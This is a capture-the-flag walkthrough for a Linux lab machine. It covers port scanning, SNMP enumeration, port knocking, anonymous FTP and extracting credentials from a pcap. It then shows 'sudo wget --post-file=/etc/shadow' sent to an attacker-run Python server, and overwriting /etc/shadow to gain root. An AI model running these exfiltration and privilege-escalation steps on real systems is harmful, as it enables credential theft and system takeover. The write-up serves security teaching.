# Machine 1

## First flag
First we should make a port scan:

```nmap -A -Pn <target-ip>```

```
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4f:d3:06:c9:29:81:07:68:3a:c1:2b:49:12:39:c6:19 (RSA)
|   256 f8:fe:33:8d:d9:d5:97:3b:14:08:18:10:4f:3a:19:5c (ECDSA)
|_  256 c2:d5:c2:60:62:0d:cd:a9:83:01:92:b6:dd:be:d6:a2 (ED25519)
80/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Here we have an ftp port with a filtered status, this means that the port on the target host is being blocked by a firewall.

Now we gonna udp scan the target host:

```nmap -sU <target-ip>```

We can see an snmp port is opened by using, ``snmpwalk`` we can wuery enabled device and take SNMP data from a device

```snmpwalk -c public <traget-ip> .```

and we have an information ftp bay on 7000 8000 9000

What we can try now is Port knocking using this sequence to try to open the port.

```Port knocking is a security technique used to control access to a network or computer system. It works by requiring the user to send a specific sequence of connection requests to a set of ports in order to gain access. The sequence of requests is known as a “knock”, and the ports are usually closed until the correct knock is received. Once the correct knock is received, the ports are opened and the user is granted access.```

We can use ```knock``` command:

```knock <target-ip> 7000 8000 9000```

Now if we retry nmap scan we can see that the ftp port is opened now:

![enter image description here](https://i.ibb.co/3khwZM6/nmap-scan.png)

Since it is opened now, we connect to it using anonymous user and anonymous in password:

```ftp anonymous@<target-ip>```

![enter image description here](https://i.ibb.co/3cY84MD/ftp.png)

and we get the file that we found ``login.pcap``. After using ``strings`` command to search for any readable information:

![enter image description here](https://i.ibb.co/Tg2Prk2/login-pcap.png)

And there we found some credentials, we can try to login using ssh after decoding the password:

![enter image description here](https://i.ibb.co/WPVVZCC/ssh.png)

we can find the first flag.

## Second Flag

After connecting to the machinem we should try ``sudo -l``:

![enter image description here](https://i.ibb.co/syH6vjV/sudo-l.png)

We can use ``wget`` as a root user without password.

So now we can get the ``shadow`` file, on our machine and try to modify it,

Now we should create an http server that support the ```POST``` http method using this pyhton script:

```
from http.server import HTTPServer, BaseHTTPRequestHandler

class  PostHandler(BaseHTTPRequestHandler):
  def  do_POST(self):
    # Read and parse post data
    post_data = self.rfile.read(int(self.headers['Content-Length']))
    # Handle request and respond
    self.send_response(200)
    self.send_header('Content-type','text/html')
    self.end_headers()
    # Save file to your machine
    with  open('path/to/save/file', 'wb') as f:
      f.write(post_data)

# Create server and define request handler
httpd = HTTPServer(('', 8080), PostHandler)
# Start serving
httpd.serve_forever()
```

> Change the path/to/save/fileto where do you want this file to be opened and name the file shadow.

After running the script our server is running on 8080 port. Now we can send the ```shadow``` file from the target machine going back to our ssh. Now we send the file using wget:

```sudo wget --post-file=/etc/shadow <my-ip>:8080```

![enter image description here](https://i.ibb.co/Jj5Tyd2/wget-post.png)

We can go back to our machine and there we can see our file is created on the path we entered.
 Now we gonna try to change the root password to kabayla password.
 
 The last step, is to replace the ``shadow`` file on the target machine with our modified ``shadow`` file.

we reopen a http server using ``python3 -m http.server``. And try to download the shadow file on the target machine using ``wget``, on the target machine:

``sudo wget <my-ip>/shadow -O /etc/shadow``

> Use of **-O** is _not_ intended to mean simply "use the name _file_ instead of the one in the URL ;" rather, it is analogous to shell redirection: **wget -O file http://foo** is intended to work like **wget -O - http://foo > file**; _file_ will be truncated immediately, and _all_ downloaded content will be written there.

So our shadow file content will be redirected to the /etc/shadow on the target machine.

And finally now we can connect to root with the password of kabayla user.

